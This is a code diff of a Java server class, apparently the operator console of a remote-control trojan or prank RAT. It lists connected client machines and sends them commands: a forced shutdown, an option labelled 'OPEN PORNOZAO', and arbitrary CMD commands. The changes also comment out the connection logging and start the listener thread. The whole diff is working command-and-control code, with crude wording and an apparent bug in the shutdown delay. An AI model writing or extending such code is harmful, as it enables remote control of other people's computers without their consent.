@@ -36,28 +36,32 @@ public class Servidor extends Thread {
      */
     public void run() {
         try {
-            String msg;
             OutputStream outPutStream = this.con.getOutputStream();
             Writer writer = new OutputStreamWriter(outPutStream);
-            BufferedWriter bufferedWriter = new BufferedWriter(writer);
+            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
             clients.add(bufferedWriter);
-            name = msg = bfr.readLine();
+            name = bfr.readLine();
             clientsNames.put(bufferedWriter, name);
-            System.out.println("Client connected: " + name);
+            //System.out.println("Client connected: " + name);
 
+            if (clients.size() <= 1) showOptions();
             final BufferedReader gambi = bfr;
 
             new Thread(() -> {
                 while (true) {
                     try {
                         String msgg = gambi.readLine();
-                        System.out.println(msgg == null ? "User disconnected" : msgg);
+                        if (msgg == null) {
+                            System.out.println("User disconnected: " + clientsNames.get(bufferedWriter));
+                            clientsNames.remove(bufferedWriter);
+                            clients.remove(bufferedWriter);
+                            break;
+                        }
                     } catch (IOException e) {
                         e.printStackTrace();
                     }
                 }
-            });
-            showOptions();
+            }).start();
 
         } catch (Exception e) {
             e.printStackTrace();
@@ -106,14 +110,14 @@ public class Servidor extends Thread {
 
             new Thread(() -> {
                 while (true) {
-                    System.out.println("Waiting connection...");
+                    //System.out.println("Waiting connection...");
                     Socket con = null;
                     try {
                         con = server.accept();
                     } catch (IOException e) {
                         e.printStackTrace();
                     }
-                    System.out.println("Client connected...");
+                    //System.out.println("Client connected...");
                     Thread t = new Servidor(con);
                     t.start();
                 }
@@ -125,60 +129,62 @@ public class Servidor extends Thread {
     }
 
     private static void showOptions() {
+        try {
+            int clientSelected;
+            int optionSelected;
 
-        int clientSelected;
-        int optionSelected;
-
-        System.out.println("-----------------------------------------");
-
-        if (clients.size() > 0) {
-            reader = new Scanner(System.in);
-            do {
-                for (int i = 0; i < clients.size(); i++) {
-                    System.out.println("(" + i + ") -> ClientName: " + clientsNames.get(clients.get(i)));
-                }
-
-                System.out.println("-----------------------------------------");
-
-                do {
-                    System.out.print("Select a client: >. ");
-                    clientSelected = reader.nextInt();
-                    if (clientSelected > clients.size() - 1 || clientSelected < 0) {
-                        System.out.println("Select a valid client");
-                    }
-                } while (clientSelected > clients.size() - 1 || clientSelected < 0);
-
-                do {
-                    System.out.println("0 - TURN OFF COMPUTER");
-                    System.out.println("1 - OPEN PORNOZAO");
-                    System.out.println("2 - CMD COMMAND");
-
-                    System.out.print(">. ");
-                    optionSelected = reader.nextInt();
-
-                    if (optionSelected > 2 || optionSelected < 0) {
-                        System.out.println("Select a valid option fuck!");
-                    }
-
-                } while (optionSelected > 2 || optionSelected < 0);
-
-                if (optionSelected == 0) {
-
-                    System.out.println("SHUTDOWN TIME (SECONDS): ");
-                    long time = reader.nextLong();
-                    sendMsgToClient(clients.get(clientSelected), "shutdown -s -t " + (time <= 0 ? 30000 : time * 1000));
-
-                } else if (optionSelected == 1) {
-
-                } else if (optionSelected == 2) {
-                    String command = reader.nextLine();
-                    sendMsgToClient(clients.get(clientSelected), command == null ? "" : command);
-                }
-                System.out.println("Command send!");
-            } while (true);
-        } else {
-            System.out.println("No connected users!");
             System.out.println("-----------------------------------------");
+
+            if (clients.size() > 0) {
+                reader = new Scanner(System.in);
+                do {
+                    for (int i = 0; i < clients.size(); i++) {
+                        System.out.println("(" + i + ") -> ClientName: " + clientsNames.get(clients.get(i)));
+                    }
+
+                    System.out.println("-----------------------------------------");
+
+                    do {
+                        System.out.print("Select a client: >. ");
+                        clientSelected = reader.nextInt();
+                        if (clientSelected > clients.size() - 1 || clientSelected < 0) {
+                            System.out.println("Select a valid client");
+                        }
+                    } while (clientSelected > clients.size() - 1 || clientSelected < 0);
+
+                    do {
+                        System.out.println("0 - TURN OFF COMPUTER");
+                        System.out.println("1 - OPEN PORNOZAO");
+                        System.out.println("2 - CMD COMMAND");
+
+                        System.out.print(">. ");
+                        optionSelected = reader.nextInt();
+
+                        if (optionSelected > 2 || optionSelected < 0) {
+                            System.out.println("Select a valid option fuck!");
+                        }
+
+                    } while (optionSelected > 2 || optionSelected < 0);
+
+                    if (optionSelected == 0) {
+
+                        System.out.println("SHUTDOWN TIME (SECONDS): ");
+                        long time = reader.nextLong();
+                        sendMsgToClient(clients.get(clientSelected), "shutdown -s -t " + (time <= 0 ? 30000 : time * 1000));
+
+                    } else if (optionSelected == 1) {
+
+                    } else if (optionSelected == 2) {
+                        String command = reader.nextLine();
+                        sendMsgToClient(clients.get(clientSelected), command == null ? "" : command);
+                    }
+                    System.out.println("Command send!");
+                } while (true);
+            } else {
+                System.out.println("No connected users!");
+                System.out.println("-----------------------------------------");
+            }
+        } catch (Exception ignored) {
         }
     }
 }
